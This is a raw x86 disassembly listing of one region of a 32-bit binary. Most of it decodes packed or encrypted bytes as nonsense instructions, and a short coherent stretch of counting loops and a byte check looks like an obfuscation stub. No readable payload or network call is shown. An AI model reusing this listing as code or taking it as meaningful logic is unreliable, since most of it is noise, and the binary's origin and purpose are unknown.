  416f71:	xchg   ebp,eax
  416f72:	mov    al,0x13
  416f74:	arpl   WORD PTR [edi+edx*8-0x55f09741],bx
  416f7b:	out    0xe1,eax
  416f7d:	sub    BYTE PTR [esi-0x39],dh
  416f80:	shr    BYTE PTR [ebx],cl
  416f82:	lods   eax,DWORD PTR ds:[esi]
  416f83:	mov    eax,ds:0xaeb8ae00
  416f88:	(bad)  
  416f89:	pop    ss
  416f8a:	mov    ecx,0xfffd38ca
  416f8f:	test   al,0xe2
  416f91:	dec    edx
  416f92:	and    DWORD PTR [edi+0x4f2e530b],ebx
  416f98:	add    eax,0x4bb4122e
  416f9d:	add    eax,0x917db89d
  416fa2:	ja     0x416fb8
  416fa4:	pop    esi
  416fa5:	dec    esp
  416fa6:	hlt    
  416fa7:	add    edx,DWORD PTR [ebx]
  416fa9:	mov    bl,BYTE PTR [eax+0x7b]
  416fac:	mov    edi,0x15c87100
  416fb1:	test   eax,0xb33b37de
  416fb6:	call   0x41b5cc8
  416fbb:	cdq    
  416fbc:	bound  esi,QWORD PTR [ecx+0x21]
  416fbf:	out    0x68,al
  416fc1:	jl     0x416f6e
  416fc3:	repz aas 
  416fc5:	es push es
  416fc7:	mov    ds:0xacafd941,eax
  416fcc:	sahf   
  416fcd:	lea    edx,[ecx+0xb]
  416fd0:	push   esi
  416fd1:	push   0x2015c42a
  416fd6:	int    0xde
  416fd8:	cdq    
  416fd9:	push   edi
  416fda:	xchg   ecx,eax
  416fdb:	sbb    esi,DWORD PTR [edx-0x4920806d]
  416fe1:	popf   
  416fe2:	fbld   TBYTE PTR [ebp-0x77b17df4]
  416fe8:	xor    BYTE PTR ds:0xf6c004ef,dl
  416fee:	lods   eax,DWORD PTR ds:[esi]
  416fef:	xor    edx,ebx
  416ff1:	xor    bl,BYTE PTR es:[esi]
  416ff4:	out    0x35,al
  416ff6:	in     eax,0x6d
  416ff8:	cmp    eax,0x6cfe67b2
  416ffd:	xor    cl,BYTE PTR [edi+0x55]
  417000:	clc    
  417001:	add    al,BYTE PTR [eax+0x78cd203c]
  417007:	mov    esp,0xc80db64b
  41700c:	cmp    eax,0xe9c5ff6b
  417011:	mov    dl,0x42
  417013:	mov    fs,WORD PTR [esi-0x13c04364]
  417019:	pop    ecx
  41701a:	and    eax,DWORD PTR [ebx]
  41701c:	std    
  41701d:	xchg   ebx,eax
  41701e:	add    BYTE PTR [ecx],0xd7
  417021:	jp     0x416fa6
  417023:	pop    eax
  417024:	mov    eax,ds:0x7c87b14b
  417029:	add    eax,0x950239e9
  41702e:	and    DWORD PTR [eax],eax
  417030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417031:	js     0x41704f
  417033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417034:	fwait
  417035:	pop    ds
  417036:	xor    esi,ecx
  417038:	adc    DWORD PTR [eax+ebx*8+0x39],edx
  41703c:	daa    
  41703d:	dec    ecx
  41703e:	mov    ch,0xec
  417040:	mov    dl,0x1d
  417042:	jl     0x4170b0
  417044:	dec    edi
  417045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417046:	inc    ebx
  417047:	mov    ecx,0xd3558de6
  41704c:	pop    ds
  41704d:	loop   0x417086
  41704f:	xlat   BYTE PTR ds:[ebx]
  417050:	push   eax
  417051:	adc    al,0x3
  417053:	(bad)  
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x7baa49bb],edx
  41706d:	cmp    al,BYTE PTR [ebp+0x2b]
  417070:	jg     0x4170ea
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417026
  417077:	jo     0x417059
  417079:	sub    DWORD PTR [edx-0x16],0x7094765c
  417080:	pusha  
  417081:	xchg   ebp,eax
  417082:	iret   
  417083:	jns    0x4170a4
  417085:	or     ebx,DWORD PTR [edx-0x65]
  417088:	pop    esi
  417089:	out    0xa4,al
  41708b:	pop    esi
  41708c:	rcl    DWORD PTR [eax+0x67],cl
  41708f:	retf   0x3aca
  417092:	icebp  
  417093:	push   ebp
  417094:	outs   dx,DWORD PTR ds:[esi]
  417095:	cmp    cl,BYTE PTR [edi-0x5992d3a8]
  41709b:	js     0x4170b0
  41709d:	sar    dh,cl
  41709f:	cmp    ecx,eax
  4170a1:	pop    esi
  4170a2:	in     eax,dx
  4170a3:	and    DWORD PTR [edx+edx*8],edx
  4170a6:	jp     0x417126
  4170a8:	mov    ds:0xbc0888e1,al
  4170ad:	clc    
  4170ae:	cmp    al,0x20
  4170b0:	in     al,dx
  4170b1:	jg     0x4170f9
  4170b3:	lods   al,BYTE PTR ds:[esi]
  4170b4:	js     0x417135
  4170b6:	in     eax,dx
  4170b7:	pop    esp
  4170b8:	adc    cl,al
  4170ba:	or     BYTE PTR ds:0x84ff1e65,ah
  4170c0:	jb     0x4170a6
  4170c2:	retf   
  4170c3:	into   
  4170c4:	inc    edi
  4170c5:	dec    edx
  4170c6:	add    ebx,edx
  4170c8:	es mov esi,0x130a770d
  4170ce:	stos   BYTE PTR es:[edi],al
  4170cf:	cmp    ecx,DWORD PTR [ecx+0x73]
  4170d2:	cdq    
  4170d3:	xor    edx,DWORD PTR [ecx+0x5]
  4170d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170d7:	jle    0x4170a0
  4170d9:	push   eax
  4170da:	xchg   esp,eax
  4170db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170dc:	aam    0x4f
  4170de:	aam    0x64
  4170e0:	add    edx,DWORD PTR [edi-0x4aa757b0]
  4170e6:	lods   eax,DWORD PTR ds:[esi]
  4170e7:	shl    DWORD PTR [edx-0x9],cl
  4170ea:	popa   
  4170eb:	inc    edi
  4170ec:	pop    ecx
  4170ed:	out    0x39,eax
  4170ef:	sub    ebp,eax
  4170f1:	inc    esp
  4170f2:	sub    DWORD PTR [esp+edi*2+0xa1af78a],esi
  4170f9:	std    
  4170fa:	sbb    DWORD PTR [edx],0xeeda57fc
  417100:	push   0x68
  417102:	add    al,0xd8
  417104:	adc    cl,BYTE PTR [esi-0x1d]
  417107:	push   ds
  417108:	cmc    
  417109:	int3   
  41710a:	sti    
  41710b:	cmp    al,0x3e
  41710d:	or     DWORD PTR [edx],eax
  41710f:	jae    0x417142
  417111:	shl    BYTE PTR [edx-0x3],0x47
  417115:	inc    ebp
  417116:	jno    0x4170f2
  417118:	clc    
  417119:	add    DWORD PTR [edx-0x902a55b],0xd45c15f9
  417123:	mov    ebp,edi
  417125:	pop    eax
  417126:	inc    edi
  417127:	fdiv   QWORD PTR [ebx]
  417129:	test   ebp,edx
  41712b:	add    al,0xa7
  41712d:	aaa    
  41712e:	sahf   
  41712f:	leave  
  417130:	mov    dh,0x3d
  417132:	inc    esi
  417133:	and    DWORD PTR [ecx-0x2947954c],edx
  417139:	shl    BYTE PTR [edi-0x648d2d4],0x62
  417140:	lods   eax,DWORD PTR ds:[esi]
  417141:	dec    ebx
  417142:	frstor [eax-0x372d91de]
  417148:	pop    es
  417149:	xor    eax,0x8a1f6da7
  41714e:	xor    al,0xaa
  417150:	jmp    DWORD PTR [edi-0x4df6fe47]
  417156:	cmp    BYTE PTR ds:0x3f323b24,bl
  41715c:	push   es
  41715d:	jecxz  0x4171ac
  41715f:	fwait
  417160:	(bad)  
  417161:	loopne 0x4171bb
  417163:	outs   dx,BYTE PTR ds:[esi]
  417164:	ror    DWORD PTR [edx-0xeedf226],cl
  41716a:	lods   eax,DWORD PTR ds:[esi]
  41716b:	xchg   ebp,eax
  41716c:	fld    QWORD PTR [ebp+esi*4-0x67]
  417170:	add    ch,BYTE PTR [ecx+ebp*1-0x6e]
  417174:	sub    eax,0xe8cd72b5
  417179:	add    BYTE PTR [edi+esi*2-0x46],dl
  41717d:	adc    BYTE PTR [edi],al
  41717f:	mov    esp,0x83f4c9d4
  417184:	test   eax,0xe314efcc
  417189:	mov    al,0x6b
  41718b:	dec    esi
  41718c:	stos   BYTE PTR es:[edi],al
  41718d:	mov    dl,0xe
  41718f:	jmp    0x193ed780
  417194:	mov    ebp,DWORD PTR [eax+0x4b29fd18]
  41719a:	xchg   esp,eax
  41719b:	or     esp,DWORD PTR [eax-0x69]
  41719e:	(bad)  
  41719f:	cs pop ds
  4171a1:	imul   ecx,DWORD PTR [edx+0x78cdf30b],0x3bd895cd
  4171ab:	rcl    BYTE PTR ds:0x29074cbe,0x54
  4171b2:	mov    ch,0x83
  4171b4:	push   ecx
  4171b5:	cmp    BYTE PTR [eax],0xe4
  4171b8:	sbb    al,0x56
  4171ba:	in     al,dx
  4171bb:	xchg   DWORD PTR [ecx+0x605e0f57],edx
  4171c1:	jae    0x4171a2
  4171c3:	jg     0x417146
  4171c5:	fwait
  4171c6:	xchg   edx,eax
  4171c7:	pop    edi
  4171c8:	ret    0x5b3a
  4171cb:	es add si,di
  4171cf:	mov    dl,0xcb
  4171d1:	popf   
  4171d2:	and    ecx,DWORD PTR ds:0x489b56c5
  4171d8:	pop    edx
  4171d9:	lock rol BYTE PTR [edi+ecx*4],cl
  4171dd:	adc    al,0xf8
  4171df:	xlat   BYTE PTR ds:[ebx]
  4171e0:	adc    al,0x5
  4171e2:	dec    edi
  4171e3:	pop    esp
  4171e4:	inc    ebx
  4171e5:	out    dx,eax
  4171e6:	inc    esp
  4171e7:	or     esi,DWORD PTR [ecx-0x1b5b15c1]
  4171ed:	ins    DWORD PTR es:[edi],dx
  4171ee:	pop    es
  4171ef:	xchg   esp,eax
  4171f0:	sbb    dl,0x2a
  4171f3:	icebp  
  4171f4:	lahf   
  4171f5:	leave  
  4171f6:	sub    DWORD PTR [eax+0x1dcf1325],esi
  4171fc:	les    ecx,FWORD PTR [eax-0x1e]
  4171ff:	dec    esp
  417200:	cmp    eax,ecx
  417202:	scas   al,BYTE PTR es:[edi]
  417203:	repnz cwde 
  417205:	or     eax,0xf1faa2e9
  41720a:	pop    ss
  41720b:	push   esp
  41720c:	jae    0x417216
  41720e:	jecxz  0x41721e
  417210:	imul   ecx,eax,0xfffffff8
  417213:	push   edi
  417214:	push   es
  417215:	out    0xf3,al
  417217:	int    0x50
  417219:	fidiv  DWORD PTR [ebp+0x1c7b410d]
  41721f:	stc    
  417220:	lock outs dx,DWORD PTR ds:[esi]
  417222:	ret    0x988e
  417225:	mov    edx,0x41decb99
  41722a:	aas    
  41722b:	sub    bh,cl
  41722d:	mov    edx,ecx
  41722f:	mov    edi,0x3f334526
  417234:	add    al,0xdd
  417236:	inc    esi
  417237:	xor    dl,BYTE PTR [esi-0x731c6ce8]
  41723d:	inc    ebx
  41723e:	sub    eax,0x432f6e50
  417243:	loope  0x4172a6
  417245:	xor    al,al
  417247:	push   esi
  417248:	sbb    ebp,ecx
  41724a:	mov    ah,0x63
  41724c:	add    ecx,DWORD PTR gs:[ecx-0x7ced9ed1]
  417253:	mov    esi,0xc9110802
  417258:	pop    ds
  417259:	mov    bl,BYTE PTR [ebx+ebx*2-0x32]
  41725d:	stos   DWORD PTR es:[edi],eax
  41725e:	arpl   WORD PTR [esi+ecx*8+0x387354bc],dx
  417265:	fadd   QWORD PTR [eax-0x6c]
  417268:	or     eax,0x518dc5be
  41726d:	lock rcr BYTE PTR [ebp+edi*2+0x2c],cl
  417272:	rcl    al,cl
  417274:	outs   dx,DWORD PTR ds:[esi]
  417275:	(bad)  
  417276:	inc    edx
  417277:	data16 cmc 
  417279:	sub    bl,ah
  41727b:	aam    0x0
  41727d:	fcomi  st,st(7)
  41727f:	add    esp,ebp
  417281:	fisttp QWORD PTR [ecx-0x29]
  417284:	push   0xf043009c
  417289:	xor    eax,0x7ddddaa6
  41728e:	jno    0x41722c
  417290:	inc    edi
  417291:	push   ebx
  417292:	ficomp WORD PTR [ecx+0x6404cb24]
  417298:	lds    ebx,FWORD PTR [bp+di+0x642f]
  41729d:	inc    eax
  41729e:	mov    al,0x22
  4172a0:	cmp    edx,DWORD PTR [eax-0x29bed318]
  4172a6:	push   ecx
  4172a7:	ja     0x41725f
  4172a9:	in     al,0x69
  4172ab:	mov    dl,0xd3
  4172ad:	xor    ebx,DWORD PTR [edi+0x72]
  4172b0:	jb     0x41725d
  4172b2:	push   ecx
  4172b3:	add    eax,0x8cc66fd9
  4172b8:	out    dx,eax
  4172b9:	jmp    0x11b0567e
  4172be:	mov    ch,0x34
  4172c0:	xor    DWORD PTR [eax+edx*8],esi
  4172c3:	jmp    0x1fe2:0x609f3880
  4172ca:	in     al,dx
  4172cb:	lods   al,BYTE PTR ds:[esi]
  4172cc:	mov    ah,BYTE PTR [edx-0x11b82911]
  4172d2:	test   eax,0xcc2347fe
  4172d7:	and    DWORD PTR ds:0xf32a0035,ecx
  4172dd:	(bad)  
  4172df:	xchg   esi,eax
  4172e0:	ror    ah,cl
  4172e2:	cmp    BYTE PTR [esi-0xabe7532],0x76
  4172e9:	pop    es
  4172ea:	jl     0x41733a
  4172ec:	inc    eax
  4172ed:	adc    DWORD PTR [ebp-0x42c2defd],eax
  4172f3:	pusha  
  4172f4:	test   eax,0xdd2d57d1
  4172f9:	adc    eax,DWORD PTR [esi-0x75]
  4172fc:	fcom   DWORD PTR [esi+eax*2]
  4172ff:	sub    al,0x5a
  417301:	and    DWORD PTR [ebx-0x6a],ecx
  417304:	and    BYTE PTR [edx-0x32731446],0x9d
  41730b:	dec    eax
  41730c:	cs pop esi
  41730e:	nop
  41730f:	pop    ds
  417310:	mov    ds:0xfff875ff,eax
  417315:	jne    0x417313
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	shr    BYTE PTR [edx+ebx*2],1
  417335:	mov    dh,0x24
  417337:	loop   0x417361
  417339:	jg     0x4173b3
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x417367
  417340:	inc    ecx
  417341:	je     0x41733b
  417343:	add    eax,0x14ed4d1e
  417348:	push   eax
  417349:	and    DWORD PTR [esi],edi
  41734b:	bound  esp,QWORD PTR [edi]
  41734d:	jmp    0x797e:0x97fa89ef
  417354:	ss dec edx
  417356:	leave  
  417357:	add    edi,DWORD PTR [eax+ecx*4]
  41735a:	xchg   BYTE PTR [edi+0x58],bl
  41735d:	and    eax,DWORD PTR [esi+ebx*2+0x27]
  417361:	out    0xbb,al
  417363:	sbb    al,0x3c
  417365:	xchg   DWORD PTR [ebx],ecx
  417367:	xor    al,0x36
  417369:	lea    esi,[edx+0x297922bb]
  41736f:	sbb    DWORD PTR [ebx-0x791ce214],esi
  417375:	ds stos DWORD PTR es:[edi],eax
  417377:	push   ecx
  417378:	pop    ebx
  417379:	mov    al,0x2d
  41737b:	fnstsw WORD PTR [ebx]
  41737d:	daa    
  41737e:	or     bh,BYTE PTR [esi+ebx*4]
  417381:	out    0x52,eax
  417383:	cld    
  417384:	mov    esp,0x62410714
  417389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41738a:	pop    ecx
  41738b:	and    bh,dh
  41738d:	or     al,0x6b
  41738f:	add    eax,0x3fb162b5
  417394:	fsubr  st(1),st
  417396:	jnp    0x4173dd
  417398:	imul   edx,DWORD PTR [ebx-0x237920bc],0xffffffbd
  41739f:	in     eax,0xf0
  4173a1:	push   es
  4173a2:	mov    al,ds:0xfcb00563
  4173a7:	out    0x85,eax
  4173a9:	adc    eax,0x87bc11c5
  4173ae:	fstp   QWORD PTR [ecx+eiz*1-0x2324b4ca]
  4173b5:	addr16 je 0x417386
  4173b8:	ss je  0x417378
  4173bb:	pop    ss
  4173bc:	xor    al,0xd4
  4173be:	lock pop ebx
  4173c0:	mov    ah,ch
  4173c2:	sub    al,0xb
  4173c4:	shl    DWORD PTR [edi-0x40],0xe2
  4173c8:	mov    eax,0x4d9dc40c
  4173cd:	add    BYTE PTR [ebx],ah
  4173cf:	lds    edx,FWORD PTR [esi+edx*4-0x507fea80]
  4173d6:	icebp  
  4173d7:	add    al,0xae
  4173d9:	neg    edx
  4173db:	mov    esp,0x34cf6863
  4173e0:	sbb    eax,0xee87f2e1
  4173e5:	repnz push cs
  4173e7:	hlt    
  4173e8:	sub    ebp,esi
  4173ea:	sbb    ebp,esp
  4173ec:	inc    ebx
  4173ed:	or     DWORD PTR [edi-0x608c98db],esi
  4173f3:	fbstp  TBYTE PTR [ebx]
  4173f5:	pop    ebp
  4173f6:	rcr    DWORD PTR [edi-0x45],1
  4173f9:	loop   0x4173a4
  4173fb:	cmp    ah,BYTE PTR [edi]
  4173fd:	or     bh,BYTE PTR [ebx]
  4173ff:	push   esi
  417400:	mov    ah,0xad
  417402:	pop    eax
  417403:	add    al,0xd3
  417405:	jo     0x4173db
  417407:	cmp    edx,esi
  417409:	repz pop esi
  41740b:	mov    ds:0x656eeacb,eax
  417410:	ins    BYTE PTR es:[edi],dx
  417411:	pop    ecx
  417412:	adc    ch,BYTE PTR [ebx-0x6605d906]
  417418:	add    DWORD PTR [ebx-0x7099feb5],0x200851fc
  417422:	adc    eax,0x743639cb
  417427:	inc    esi
  417428:	adc    BYTE PTR gs:[eax],0x5d
  41742c:	jge    0x41740b
  41742e:	scas   al,BYTE PTR es:[edi]
  41742f:	nop
  417430:	xchg   esi,eax
  417431:	mov    ah,0x32
  417433:	iret   
  417434:	mov    ah,0xdc
  417436:	inc    ebp
  417437:	lea    ebx,[edi+0x7496869d]
  41743d:	mov    ebx,0xa8e0d18a
  417442:	xchg   eax,eax
  417444:	inc    ebp
  417445:	jge    0x41741f
  417447:	int3   
  417448:	jp     0x4174b6
  41744a:	inc    esp
  41744b:	int    0xe1
  41744d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41744e:	mov    esp,0xa6745eed
  417453:	mov    ?,esi
  417455:	mov    ch,0xf4
  417457:	pop    ebx
  417458:	and    eax,0x9caba1c6
  41745d:	pop    es
  41745e:	in     al,dx
  41745f:	in     eax,0x5b
  417461:	nop
  417462:	xor    esp,DWORD PTR [eax-0x7766c3f7]
  417468:	cmp    al,0x59
  41746a:	jnp    0x4174bf
  41746c:	pop    es
  41746d:	sub    DWORD PTR [ebx+0x51f203e1],edi
  417473:	mul    BYTE PTR [ebp-0x3f]
  417476:	and    ebx,DWORD PTR [ecx+0x14fca47c]
  41747c:	mov    bl,0xc
  41747e:	gs ret 
  417480:	fwait
  417481:	cli    
  417482:	mov    esp,0xcc6947cc
  417487:	sub    bh,al
  417489:	enter  0xa758,0x2c
  41748d:	in     al,dx
  41748e:	push   esi
  41748f:	mov    BYTE PTR [ebx-0xb],bl
  417492:	inc    edi
  417493:	jg     0x417485
  417495:	in     al,0xef
  417497:	jnp    0x4174fe
  417499:	sar    BYTE PTR [eax],1
  41749b:	vmread edx,edi
  41749e:	out    dx,al
  41749f:	(bad)  
  4174a0:	xchg   ebx,eax
  4174a1:	push   edi
  4174a2:	sbb    ecx,DWORD PTR [esp+eiz*4+0x6f]
  4174a6:	stc    
  4174a7:	cmp    edi,ecx
  4174a9:	aad    0xfa
  4174ab:	dec    edi
  4174ac:	pop    esp
  4174ad:	(bad)  
  4174ae:	jle    0x41752a
  4174b0:	xchg   al,ah
  4174b2:	ret    0x638c
  4174b5:	pop    esp
  4174b6:	fistp  WORD PTR [eax]
  4174b8:	xor    eax,0xbc7c2dd7
  4174bd:	add    ah,ah
  4174bf:	rol    bh,cl
  4174c1:	rcl    BYTE PTR [eax],1
  4174c3:	and    BYTE PTR [esi-0x24],al
  4174c6:	xlat   BYTE PTR ds:[ebx]
  4174c7:	ss push ebp
  4174c9:	xor    ebx,DWORD PTR [ebp-0x73bc226b]
  4174cf:	popa   
  4174d0:	fmul   DWORD PTR [ecx-0x1c]
  4174d3:	cld    
  4174d4:	pop    ebx
  4174d5:	cwde   
  4174d6:	pop    ebp
  4174d7:	push   ds
  4174d8:	imul   ebx,esp,0x17
  4174db:	call   FWORD PTR [edi]
  4174dd:	mov    esp,0x1ad949e6
  4174e2:	xchg   esi,eax
  4174e3:	mov    fs,WORD PTR [ecx]
  4174e5:	cmp    al,0xc4
  4174e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174e8:	fsubr  DWORD PTR ss:[edx-0x2d]
  4174ec:	sub    al,BYTE PTR [ecx+ecx*4]
  4174ef:	ficom  WORD PTR [edx+0x4489142f]
  4174f5:	pop    ebp
  4174f6:	daa    
  4174f7:	xchg   ebp,eax
  4174f8:	mov    edi,DWORD PTR [esi]
  4174fa:	add    eax,0xf66cb081
  4174ff:	ds shr ebx,cl
  417502:	adc    BYTE PTR [esi],cl
  417504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417505:	push   ss
  417506:	mov    al,ds:0xc1fc8866
  41750b:	imul   ecx,ebp,0xffffff95
  41750e:	and    ebp,esp
  417510:	js     0x417547
  417512:	mov    edi,0x3081c69c
  417517:	out    0x65,eax
  417519:	mov    ss,WORD PTR [eax+0x25]
  41751c:	fstp   QWORD PTR [edx+0x22]
  41751f:	mov    ds:0x593d4c20,al
  417524:	jp     0x41750d
  417526:	dec    edi
  417527:	xchg   edx,eax
  417528:	xor    al,0x83
  41752a:	es mov ah,0x8b
  41752d:	pop    es
  41752e:	push   cs
  41752f:	dec    edi
  417530:	jo     0x4174b4
  417532:	sub    BYTE PTR [edi],bl
  417534:	js     0x4174fb
  417536:	mov    esp,0x1712e7f6
  41753b:	loop   0x417525
  41753d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41753e:	mov    bh,0xdb
  417540:	fnstenv [esi+0x7a]
  417543:	sbb    bh,BYTE PTR [esi+0x708ca598]
  417549:	pop    ebx
  41754a:	lea    esp,[edx]
  41754c:	daa    
  41754d:	xchg   ecx,eax
  41754e:	(bad)  
  417550:	sahf   
  417551:	lods   eax,DWORD PTR ds:[esi]
  417552:	lock inc ebp
  417554:	jle    0x417564
  417556:	fild   QWORD PTR gs:[ebp-0x17]
  41755a:	pop    es
  41755b:	sbb    al,0x96
  41755d:	pop    es
  41755e:	mov    al,ds:0xf81b343b
  417563:	xor    bl,dl
  417565:	inc    ebp
  417566:	(bad)  
  417567:	call   0x803a2136
  41756c:	or     BYTE PTR [esi+0x325e185],cl
  417572:	sub    edi,ebx
  417574:	xor    edi,ecx
  417576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417577:	inc    ebp
  417578:	pushf  
  417579:	push   0x5b5c3823
  41757e:	inc    ebx
  41757f:	ret    0x3d3f
  417582:	dec    edx
  417583:	mov    ch,0xe0
  417585:	lds    ebp,FWORD PTR [esi-0x390bb18a]
  41758b:	fdivr  st,st(7)
  41758d:	imul   ebp,ebp,0x594eecba
  417593:	pop    esp
  417594:	scas   al,BYTE PTR es:[edi]
  417595:	cmp    BYTE PTR [ebx-0x5d],ah
  417598:	jg     0x417573
  41759a:	sti    
  41759b:	dec    ebp
  41759c:	xor    al,0x13
  41759e:	push   esi
  41759f:	and    DWORD PTR [eax+0x9],edx
  4175a2:	pop    ebp
  4175a3:	sbb    al,BYTE PTR [edi-0x7d7b11b9]
  4175a9:	pop    edi
  4175aa:	pop    ebx
  4175ab:	xor    edx,DWORD PTR [edi+0x3cc4850a]
  4175b1:	add    eax,0x246e2bc0
  4175b6:	push   DWORD PTR [ebx-0x18]
  4175b9:	or     eax,0x8384baa8
  4175be:	ss cmc 
  4175c0:	ins    BYTE PTR es:[edi],dx
  4175c1:	dec    esp
  4175c2:	repz call 0x9e22e8bd
  4175c8:	in     al,dx
  4175c9:	push   ecx
  4175ca:	or     BYTE PTR [ecx+0xd8c92df],bl
  4175d0:	jmp    FWORD PTR [esi+ecx*1-0x6a20a2cf]
  4175d7:	call   0xc95e:0xc603a914
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	adc    DWORD PTR [ecx],edx
  4176bc:	inc    eax
  4176bd:	into   
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0xf378787e
  4176c7:	lea    edi,[ecx+0x6e]
  4176ca:	push   DWORD PTR [ebx+0x2f]
  4176cd:	pushf  
  4176ce:	xor    cl,BYTE PTR [edi]
  4176d0:	xor    al,0x51
  4176d2:	es adc eax,0x73807dd9
  4176d8:	adc    BYTE PTR [ebp+0x467675ff],0xdb
  4176df:	jecxz  0x417730
  4176e1:	push   eax
  4176e2:	jg     0x417757
  4176e4:	aaa    
  4176e5:	aas    
  4176e6:	int    0xf
  4176e8:	arpl   di,bx
  4176ea:	mov    al,0x90
  4176ec:	or     esp,DWORD PTR [eax+0x47de6b7c]
  4176f2:	xor    dh,bh
  4176f4:	fwait
  4176f5:	or     eax,0xa81a0ad8
  4176fa:	xor    al,0x2e
  4176fc:	je     0x4176de
  4176fe:	fs xchg ebx,eax
  417700:	cs into 
  417702:	mov    eax,ds:0x7e80a9b1
  417707:	pop    eax
  417708:	mov    ebx,0xdb2072bd
  41770d:	stos   BYTE PTR es:[edi],al
  41770e:	xchg   ebx,eax
  41770f:	call   0xcc5e:0xacd1aa61
  417716:	stc    
  417717:	mov    ds:0x7976a26e,eax
  41771c:	mov    bl,0x81
  41771e:	mov    cl,0x8e
  417720:	and    esp,DWORD PTR [ecx+0x3f]
  417723:	dec    ecx
  417724:	jae    0x417746
  417726:	aam    0x3a
  417728:	sbb    eax,0x278bf497
  41772d:	or     eax,0x9759d91e
  417732:	or     ch,dh
  417734:	sub    DWORD PTR [ecx+ebx*2+0x7ae865e9],ecx
  41773b:	jo     0x4176de
  41773d:	std    
  41773e:	sbb    esi,edx
  417740:	outs   dx,BYTE PTR ds:[esi]
  417741:	add    BYTE PTR [ecx-0x72a85175],ch
  417747:	stc    
  417748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417749:	inc    esp
  41774a:	sbb    al,0x8f
  41774c:	push   edi
  41774d:	fst    QWORD PTR [ebx]
  41774f:	sbb    DWORD PTR [edi+0x5ee06336],0x30
  417756:	pusha  
  417757:	and    DWORD PTR [edi+0x459f2959],eax
  41775d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41775e:	cmp    ebp,DWORD PTR [edi+0x78]
  417761:	or     eax,0x3d877167
  417766:	adc    ah,BYTE PTR [ecx-0x4e]
  417769:	or     BYTE PTR [ebx],0x62
  41776c:	and    al,0x91
  41776e:	push   ds
  41776f:	out    0xfa,al
  417771:	sub    BYTE PTR [esi+0x1cdd5243],0x8f
  417778:	mov    eax,0xad3ad5b9
  41777d:	mov    dl,BYTE PTR [edi-0x3e713b93]
  417783:	bound  ebp,QWORD PTR [ebp+0x7d]
  417786:	stc    
  417787:	adc    al,0xb7
  417789:	fdiv   QWORD PTR [ebx]
  41778b:	pop    esi
  41778c:	mov    bh,0x42
  41778e:	dec    ecx
  41778f:	inc    ebx
  417790:	jns    0x41771a
  417792:	mov    ecx,DWORD PTR [bp+di-0x2464]
  417797:	or     eax,0xedfbfbfa
  41779c:	push   ebp
  41779d:	inc    ebx
  41779e:	icebp  
  41779f:	fptan  
  4177a1:	aam    0xa5
  4177a3:	mov    al,ds:0x5ea9f4e6
  4177a8:	cmc    
  4177a9:	cli    
  4177aa:	jbe    0x417773
  4177ac:	popa   
  4177ad:	ror    BYTE PTR [esi-0x6a49ded8],1
  4177b3:	mov    edi,DWORD PTR [esi]
  4177b5:	call   0x365f:0x6a8a8b9b
  4177bc:	sub    dh,cl
